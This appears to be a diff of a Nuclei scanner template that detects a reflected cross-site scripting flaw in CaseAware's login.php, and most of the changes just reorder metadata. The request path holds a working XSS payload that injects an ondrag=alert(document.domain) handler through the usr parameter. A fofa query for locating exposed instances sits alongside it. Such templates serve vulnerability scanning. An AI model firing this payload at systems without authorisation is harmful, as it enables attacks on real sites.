@@ -1,4 +1,5 @@
 id: caseaware-xss
+
 info:
   name: CaseAware a360inc - Cross-Site Scripting
   author: r3naissance
@@ -15,22 +16,24 @@ info:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
     cvss-score: 6.1
     cwe-id: CWE-79
-    cpe: cpe:2.3:a:a360inc:caseaware:-:*:*:*:*:*:*:*
     epss-score: 0.00286
     epss-percentile: 0.65504
+    cpe: cpe:2.3:a:a360inc:caseaware:-:*:*:*:*:*:*:*
   metadata:
+    verified: true
+    max-request: 1
+    vendor: a360inc
+    product: caseaware
     fofa-query:
       - title="CaseAware"
       - title="caseaware"
-    max-request: 1
-    product: caseaware
-    vendor: a360inc
-    verified: true
-  tags: a360inc,caseaware,vuln,xss
+  tags: xss,caseaware,a360inc,vuln
+
 http:
   - method: GET
     path:
       - "{{BaseURL}}/login.php?mid=0&usr=test%27%20draggable=true%20ondrag=alert(document.domain)%20value=%27p"
+
     matchers-condition: and
     matchers:
       - type: word
@@ -39,11 +42,13 @@ http:
           - "value='test' draggable=true ondrag=alert(document.domain)"
           - "CaseAware"
         condition: and
+
       - type: word
         part: header
         words:
           - text/html
+
       - type: status
         status:
           - 200
-        # digest: 4a0a0047304502210086f01f3117005b81a35381f54efa2a59b2d162ee1868bdb201f316fa1cf93e4602202d8f5028fbbbc26ab87990b0c81b51fe9535eac2b5f3c158588c9520ca71d449:922c64590222798bb761d5b6d8e72950
+# digest: 4a0a0047304502210086f01f3117005b81a35381f54efa2a59b2d162ee1868bdb201f316fa1cf93e4602202d8f5028fbbbc26ab87990b0c81b51fe9535eac2b5f3c158588c9520ca71d449:922c64590222798bb761d5b6d8e72950
